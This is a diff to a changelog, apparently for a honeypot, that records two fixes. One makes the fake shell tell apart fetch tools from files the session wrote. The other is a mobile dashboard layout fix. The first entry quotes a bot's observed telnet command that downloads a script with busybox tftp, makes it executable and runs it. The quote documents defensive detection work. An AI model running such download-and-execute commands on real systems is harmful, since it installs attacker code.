@@ -135,6 +135,17 @@
 
 ### Fixed
 
+- **A path to a file is no longer taken for the fetch tool of the same name** - observed
+  2026-10-09 on telnet: a bot probing for fetch tools ran `/bin/busybox tftp -g HOST -r tftp.sh
+  -l - > tftp;chmod 777 tftp;./tftp`, and the final `./tftp`, the empty file the line had just
+  written, was recorded as a second `honeypot_file_download` with the raw command and no `url`.
+  The detector and the executor now share one decision (`FakeShell::exec_target`): a command
+  token with a slash is `wget`, `curl`, `tftp`, `ftpget` or `busybox` only where the path is an
+  executable the box ships (`/usr/bin/wget`, `/bin/wget` through the usrmerge link, `bin/wget`
+  from `/usr`); a file the session wrote is that file, and a path to nothing is `No such file or
+  directory` (`not found` under dash and mksh) instead of silently running the applet of that
+  name. A saved copy of busybox named `busybox*` still fetches. Wording unchanged, checked
+  against Ubuntu 22.04.
 - **Most active on the dashboard no longer runs off a phone screen** - at 390 px the table's last
   two columns (what it did, last seen) were clipped. Below 640 px each row is now a card, the
   same pattern the queue, campaigns and samples lists use: address and events on top, the 24-hour
